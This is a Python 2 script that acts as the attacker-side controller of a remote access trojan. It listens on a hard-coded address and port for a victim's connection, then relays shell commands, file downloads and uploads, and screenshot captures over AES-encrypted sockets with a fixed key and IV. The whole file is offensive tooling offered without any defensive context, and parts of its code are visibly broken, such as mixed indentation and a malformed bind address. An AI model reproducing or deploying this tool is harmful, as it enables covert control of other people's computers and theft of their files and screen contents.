
#! /usr/bin/python

import socket
import json
import base64
from Crypto.Cipher import AES
def do_encrypt(message):
    obj = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
    ciphertext = obj.encrypt(message)
    return ciphertext

def do_decrypt(ciphertext):
    obj2 = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
    message = obj2.decrypt(ciphertext)
    return message

countshot = 1
def send(data):
	json_data = json.dumps(data)
	cipherdata = do_encrypt(json_data)
	target.send(cipherdata)

def recv():
	data = ""
	while True:
		try:
			data = data + target.recv(1024)
			text = do_decrypt(data)
			return json.loads(text) 
		except ValueError:
		       continue 


def shell():
	global countshot
	while True:
		command = raw_input("* shel\'l#~%s: " % str(ip))
		send(command)
		if command =='q':
			break
		elif command[:2] == "cd" and len(command) > 1:
			continue
		elif command[:8] == "download":
			with open(command[9:], "wb") as file:
				file_data = recv()
			        file.write(base64.b64decode(file_data))
		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as file2:
					send(base64.b64encode(file2))	
			except:
				failed = "Upload file was failed" 
				send(base64.b64encode(failed))
		elif command[:10] == "screenshot":
		      with open ("screenshot%d" % countshot, "wb") as screenshot_file:
			   image = recv()
		           if image[:4] == "[!!]":
				print(image)
			   else:
				 screenshot_file.write(base64.b64decode(image))
				 countshot += 1
		else: 
			result = recv()
			print(result)

def server():
	global sock
	global ip
	global target
	sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	#sock.bind(('100.20.118.82',54436))
	sock.bind((' 172.31.20.248', 54436))
	sock.listen(15)
	print("[+] Listening FOR")
	target, ip =sock.accept()
	print("[+]Connection Establish From: %s" % str(ip))



server()

shell()
sock.close()




























































































